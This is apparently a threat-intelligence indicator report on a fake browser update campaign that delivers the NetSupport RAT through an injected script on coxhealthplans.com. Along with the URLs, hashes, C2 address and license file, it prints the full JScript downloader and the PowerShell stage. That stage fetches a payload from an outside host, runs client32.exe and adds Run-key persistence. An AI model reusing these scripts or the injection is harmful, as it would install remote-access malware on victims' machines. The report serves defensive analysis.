THREAT IDENTIFICATION:  FAKE BROWSER UPDATE / NETSUPPORT RAT (HANEYMANEY)

INFECTED DOMAIN
coxhealthplans.com

STAGE 1 INJECTED URL
https://www.coxhealthplans.com/

STAGE 1 INJECTED JAVASCRIPT
<script type='text/javascript' src="https://marcborowy.com/cdn/wds.min.php"></script>

STAGE 2 USER-AGENT AND COOKIE CHECK URL
https://marcborowy.com/cdn/wds.min.php

ZIP FILE DOWNLOAD URL
https://marcborowy.com/cdn/zwewmrqqgqnaww.php?reqtime=1694102361781

ZIP FILE HASHES
1982bfcd4a23383436be5acfac53829e
577803df4771cf11d4fcb659cfe4264c
e403f4664400b43e7ed4e61eda5d0f96
(Files were all named: "Update - 20230907 [0-9]{2,3}.zip")

JAVASCRIPT FILE HASH
Browser_update_16.0.5336.js
dbfa6201e9d75761669e31333b21d000

JAVASCRIPT FILE CONTENTS
;
(function() {})
var e
e = (function(e) {
    aa = Function('WWW', 'return WScript.CreateObject(WWW)')
    var n = aa('MSXML2.ServerXMLHTTP.6.0')
    return n.open('GET', e, false), n.send(), n.responseText
})('https://marcborowy.com/cdn/111.php?14603')
Function(e)()

POWERSHELL SCRIPT DOWNLOAD URL
https://marcborowy.com/cdn/111.php?14603

CAPTURED POWERSHELL ZIP FILE DOWNLOAD SCRIPT
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" - Ex Bypass - NoP - C $rINdnAkmMPNwOZdMyn = 'https://invertirenmercados.com/1.php?271456';
$rkIRqDzMgYuogFkchPfpAAZkrLEIk = (New - Object System.Net.WebClient).DownloadString($rINdnAkmMPNwOZdMyn);
$cleOKRPkmwZyPsESHMBakIuy = [System.Convert]::FromBase64String($rkIRqDzMgYuogFkchPfpAAZkrLEIk);
$nXlmXsRerzqlqTxbh = [System.Environment]::GetFolderPath('ApplicationData') + '\DIVX';
if (!(Test - Path $nXlmXsRerzqlqTxbh - PathType Container)) {
    New - Item - Path $nXlmXsRerzqlqTxbh - ItemType Directory
};
$p = Join - Path $nXlmXsRerzqlqTxbh 'p.zip';
[System.IO.File]::WriteAllBytes($p, $cleOKRPkmwZyPsESHMBakIuy);
try {
    Add - Type - A System.IO.Compression.FileSystem;
    [System.IO.Compression.ZipFile]::ExtractToDirectory($p, $nXlmXsRerzqlqTxbh)
} catch {
    Write - Host 'Failed: ' + $_;
    exit
};
$e = Join - Path $nXlmXsRerzqlqTxbh 'client32.exe';
if (Test - Path $e - PathType Leaf) {
    Start - Process - FilePath $e
} else {
    Write - Host 'No exe.'
};
$s = $nXlmXsRerzqlqTxbh + '\client32.exe';
$k = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run';
$v = 'DIVX';
$t = 'String';
New - ItemProperty - Path $k - Name $v - Value $s - PropertyType $t;

PAYLOAD DOWNLOAD URL
https://invertirenmercados.com/1.php?271456

PAYLOAD FILE HASH
client32.exe
f70b67c2b3204b7ddd8b755799cccff0

PAYLOAD C2
http://5.252.177.126/fakeurl.htm

GATEWAY ADDRESS
GatewayAddress=5.252.177.126:443

NETSUPPORT RAT LICENSE FILE
1200
0xa353ff01

; NetSupport License File.
; Generated on 14:45 - 17/07/2022

[[Enforce]]

[_License]
control_only=0
expiry=
inactive=0
licensee=HANEYMANEY
maxslaves=8888
os2=1
product=10
serial_no=NSM385736
shrink_wrap=0
transport=0

ADDITIONAL REFERENCES
https://www.malwarebytes.com/blog/threat-intelligence/2023/07/socgholish-copycat-delivers-netsupport-rat



